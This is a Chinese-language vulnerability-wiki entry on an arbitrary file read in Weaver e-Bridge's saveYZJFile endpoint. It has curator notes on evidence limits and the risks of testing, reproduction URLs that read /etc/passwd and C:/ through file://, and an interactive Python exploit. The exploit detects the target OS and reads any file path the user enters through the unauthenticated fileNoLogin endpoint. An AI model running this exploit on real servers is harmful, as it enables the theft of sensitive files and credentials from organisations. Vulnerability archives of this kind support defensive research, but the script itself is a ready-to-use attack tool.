---
source: "Threekiii/Vulnerability-Wiki"
title: "泛微e-bridge saveYZJFile file://任意文件读取"
product: "泛微e-bridge"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "2018–2019多版本，具体build未知；服务文件读权限"
prerequisites: "未带凭证脚本，但部署鉴权需核"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA-E-Bridge-saveYZJFile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
id: "vw-2699d09cabc01fbbba65d903"
entity_id: "ve-2699d09cabc01fbbba65d903"
schema_version: "1"
---

# 泛微e-bridge saveYZJFile file://任意文件读取

## 条目说明

- 对象与具体问题：泛微e-bridge；saveYZJFile file://任意文件读取
- 版本、配置及部署条件：2018–2019多版本，具体build未知；服务文件读权限
- 认证与权限前提：未带凭证脚本，但部署鉴权需核
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与E-Bridge短篇同两步流程；本篇添加Windows目录/完整脚本及Linux绝对路径条件
- 仅返回id就声称存在漏洞不充分；POC_2不检查状态和内容直接成功输出
- 脚本靠特定中英文错误推断OS，强制GBK可能乱码；访问拒绝≠已修复

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

### 漏洞描述

泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。

### 漏洞影响

```
泛微云桥 e-Bridge 2018-2019 多个版本
```

### 网络测绘

```
title="泛微云桥e-Bridge"
```

### 漏洞复现

分为两种，分别为 Windows 和 Linux

#### Windows

访问 [**http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt**](http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt)

![image-20220209104944042](./.resource/泛微OA-E-Bridge-saveYZJFile-任意文件读取漏洞/media/202202091049126.png)


成功返回 **id值**,说明含有此漏洞

调用查看文件接口访问 **http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值**

![image-20220209104956250](./.resource/泛微OA-E-Bridge-saveYZJFile-任意文件读取漏洞/media/202202091049307.png)


#### Linux

访问 [**http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt**](http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt)

![image-20220209105016727](./.resource/泛微OA-E-Bridge-saveYZJFile-任意文件读取漏洞/media/202202091050824.png)


成功返回 **id值**,说明含有此漏洞

调用查看文件接口访问 **http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值**

![image-20220209105027907](./.resource/泛微OA-E-Bridge-saveYZJFile-任意文件读取漏洞/media/202202091050974.png)


### 漏洞POC

注意读取Linux系统文件时，需要完整路径

例如读取根目录下的 1.txt

应为 /1.txt 而不是 1.txt

```python
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import base64
import requests
import random
import re
import json
import sys

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                         \033[0m')
    print('+  \033[34mVersion: 泛微云桥 e-Bridge                                          \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

# 判断操作系统 or 判断漏洞是否可利用
def POC_1(target_url):
    vuln_url_1 = target_url + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt"
    vuln_url_2 = target_url + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
    vuln_url_3 = target_url + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///&fileExt=txt"


    headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        response_1 = requests.get(url=vuln_url_1, headers=headers, verify=False, timeout=10)
        response_2 = requests.get(url=vuln_url_2, headers=headers, verify=False, timeout=10)
        response_3 = requests.get(url=vuln_url_3, headers=headers, verify=False, timeout=10)
        if "无法验证您的身份" in response_1.text and "无法验证您的身份" in response_2.text:
            print("\033[31m[x] 漏洞已修复，不存在漏洞 \033[0m")
            sys.exit(0)
        else:
            if "No such file or directory" in response_1.text:
                print("\033[32m[o] 目标为 Linux 系统\033[0m")
                id = re.findall(r'"id":"(.*?)"', response_3.text)[0]
                print("\033[32m[o] 成功获取id：{}\033[0m".format(id))
                return id,"linux"
            elif "系统找不到指定的路径" in response_2.text:
                print("\033[32m[o] 目标为 Windows 系统\033[0m")
                id = re.findall(r'"id":"(.*?)"', response_1.text)[0]
                print("\033[32m[o] 成功获取id：{}\033[0m".format(id))
                return id,"windows"

            else:
                print("\033[31m[x] 无法获取目标系统\033[0m")
                sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

# 验证漏洞
def POC_2(target_url, id):
    file_url = target_url + "/file/fileNoLogin/{}".format(id)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        response = requests.get(url=file_url, headers=headers, verify=False, timeout=10)
        response.encoding = 'GBK'
        print("\033[32m[o] 成功读取：\n\033[0m{}".format(response.text))
    except Exception as e:
        print("\033[31m[x] 请求失败:{} \033[0m".format(e))
        sys.exit(0)

# windows 文件读取
def POC_3(target_url, File):
    file_url = target_url + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/{}&fileExt=txt".format(File)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        response = requests.get(url=file_url, headers=headers, verify=False, timeout=10)
        id = re.findall(r'"id":"(.*?)"', response.text)[0]
        print("\033[32m[o] 成功获取id：{}\033[0m".format(id))
        POC_2(target_url, id)
    except :
        print("\033[31m[x] 请求失败，无法读取文件 \033[0m)")

# linux读取文件
def POC_4(target_url, File):
    file_url = target_url + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://{}&fileExt=txt".format(File)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        response = requests.get(url=file_url, headers=headers, verify=False, timeout=10)
        id = re.findall(r'"id":"(.*?)"', response.text)[0]
        print("\033[32m[o] 成功获取id：{}\033[0m".format(id))
        POC_2(target_url, id)
    except:
        print("\033[31m[x] 请求失败，无法读取文件 \033[0m)")


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
    id,system = POC_1(target_url)
    POC_2(target_url, id)
    while True:
        if system == "windows":
            File = input("\033[35mFile >>> \033[0m")
            if File == "exit":
                sys.exit(0)
            else:
                POC_3(target_url, File)
        if system == "linux":
            File = input("\033[35mFile >>> \033[0m")
            if File == "exit":
                sys.exit(0)
            else:
                POC_4(target_url, File)
```

![image-20220209105047595](./.resource/泛微OA-E-Bridge-saveYZJFile-任意文件读取漏洞/media/202202091050654.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
